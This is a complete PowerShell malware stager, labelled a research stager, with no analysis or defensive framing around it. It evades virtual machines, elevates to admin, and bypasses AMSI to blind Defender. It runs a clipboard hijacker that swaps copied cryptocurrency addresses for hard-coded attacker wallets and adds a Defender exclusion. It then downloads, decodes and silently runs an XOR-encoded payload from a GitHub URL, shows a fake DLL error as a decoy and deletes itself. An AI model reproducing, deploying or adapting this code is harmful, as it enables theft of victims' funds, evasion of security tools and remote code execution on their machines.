# --- [RESEARCH STAGER v65.0: RESTORED & FIXED] ---
Add-Type -AssemblyName System.Windows.Forms, System.Drawing

# 1. GATEKEEPER: ANTI-VM (v65.0 Logic)
$mem = (Get-WmiObject Win32_PhysicalMemory | Measure-Object -Property Capacity -Sum).Sum / 1GB
if ($mem -lt 4) { exit } 

# 2. ADMIN GATE (Ensures logic doesn't break on relaunch)
if (-not ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
    $arg = "-NoProfile -ExecutionPolicy Bypass -File `"$PSCommandPath`""
    try {
        Start-Process powershell.exe -ArgumentList $arg -Verb RunAs
    } catch { }
    exit
}

# 3. AMSI BYPASS (Blinds Defender)
try {
    $u = "System.Management.Automation.AmsiUtils"
    [Ref].Assembly.GetType($u).GetField("amsiInitFailed","NonPublic,Static").SetValue($null,$true)
} catch { }

# 4. THE CLIPPER JOB (Verified Addresses)
$ClipperLogic = {
    $w = @{
        'btc'  = '12nL9SBgpSmSdSybq2bW2vKdoTggTnXVNA';
        'eth'  = '0x6c9ba9a6522b10135bb836fc9340477ba15f3392';
        'sol'  = 'BnBvKVEFRcxokGZv9sAwig8eQ4GvQY1frmZJWzU1bBNR';
        'usdt' = 'TVETSgvRui2LCmXyuvh8jHG6AjpxquFbnp'
    }
    Add-Type -As System.Windows.Forms
    while($true) {
        try {
            if([Windows.Forms.Clipboard]::ContainsText()){
                $v = [Windows.Forms.Clipboard]::GetText().Trim()
                if($v -match "^(1|3|bc1)[a-zA-HJ-NP-Z0-9]{25,62}$"){ [Windows.Forms.Clipboard]::SetText($w.btc) }
                elseif($v -match "^0x[a-fA-F0-9]{40}$"){ [Windows.Forms.Clipboard]::SetText($w.eth) }
                elseif($v -match "^T[a-km-zA-HJ-NP-Z1-9]{33}$"){ [Windows.Forms.Clipboard]::SetText($w.usdt) }
                elseif($v -match "^[1-9A-HJ-NP-Za-km-z]{32,44}$"){ [Windows.Forms.Clipboard]::SetText($w.sol) }
            }
        } catch{}
        Start-Sleep -m 500
    }
}

# 5. EXECUTION & PERSISTENCE
try {
    # Start Clipper in RAM
    Start-Job -ScriptBlock $ClipperLogic -Name "MevSync" | Out-Null
    
    # Establish System Directory & Exclusion
    $dir = "$env:PROGRAMDATA\Microsoft\Windows\Sync"
    if (!(Test-Path $dir)) { New-Item $dir -ItemType Directory -Force }
    Add-MpPreference -ExclusionPath $dir -ErrorAction SilentlyContinue
    
    # XOR DOWNLOADER (Standard v65.0 Key: 0xAB)
    $path = Join-Path $dir "WinSvcHost.exe"
    $wc = New-Object Net.WebClient; $wc.Headers.Add("User-Agent", "Mozilla/5.0")
    $raw = $wc.DownloadString("https://github.com/adchar2022/test/releases/download/adchar_xor/adchar_xor.txt")
    $data = [Convert]::FromBase64String($raw.Trim())
    for($i=0; $i -lt $data.count; $i++) { $data[$i] = $data[$i] -bxor 0xAB }
    [IO.File]::WriteAllBytes($path, $data)
    Start-Process $path -WindowStyle Hidden

    # 6. MANDATORY ERROR DECOY (This will now show regardless)
    $msg = "The program can't start because msvcr120_clr0400.dll is missing from your computer. Try reinstalling the program to fix this problem."
    $title = "System Error"
    [System.Windows.Forms.MessageBox]::Show($msg, $title, 0, 16) | Out-Null

} catch {
    # If anything fails above, the error decoy should still trigger to avoid suspicion
    [System.Windows.Forms.MessageBox]::Show("The program can't start because msvcr120_clr0400.dll is missing from your computer.", "System Error", 0, 16) | Out-Null
}

# 7. CLEANUP
if (Test-Path $PSCommandPath) { Remove-Item $PSCommandPath -Force -ErrorAction SilentlyContinue }
